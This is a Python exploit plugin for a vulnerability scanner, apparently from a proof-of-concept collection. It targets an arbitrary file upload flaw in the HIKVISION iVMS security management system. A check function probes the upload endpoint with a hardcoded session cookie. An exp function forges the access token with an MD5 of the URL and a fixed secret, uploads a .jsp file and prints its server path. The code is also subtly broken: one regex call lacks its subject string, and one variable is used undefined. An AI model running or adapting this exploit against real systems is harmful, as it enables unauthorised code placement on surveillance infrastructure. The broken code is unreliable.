#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import hashlib
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/A0mrBJ79HhWpm8rU6R8RIg',

      'huixian'   :  '存在exp函数,可上传文件',

      'method'    :   'post',

      'bugname'   :   'HIKVISION iVMS 综合安防系统任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
      }
  target = '/eps/api/resourceOperations/upload'
  data ='service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'result.*?errorCode.*?errorMessage.*?token.*?empty.*?data.*?'):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url):
  headers = {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
      "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo",
      "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169",
      }
  target = "/eps/api/resourceOperations/upload?token="
  data ='------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name="fileUploader";filename="mdtest.jsp"\r\nContent-Type: image/jpeg\r\n\r\nmdsec\r\n------WebKitFormBoundaryGEJwiloiPo'
  url1 = url + target
  try:
    md5url=url+"/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    token =  hashlib.md5(md5url.encode(encoding='UTF-8')).hexdigest()
    res=requests.post(url=url1+""+token.upper(),headers=headers,data=data,timeout=5,verify=False)
    path = res.text.replace('\"',"").replace('{',"").replace('}',"").split('resourceUuid:')[1].split(",resourceType")[0]
    if res.status_code == 200 and "success" in res.text:
      ret['huixian'] = '文件地址：'+url+'/eps/upload/'+path+'.jsp'
      res.close()
      return True
    else:
      return False
  except:
    return False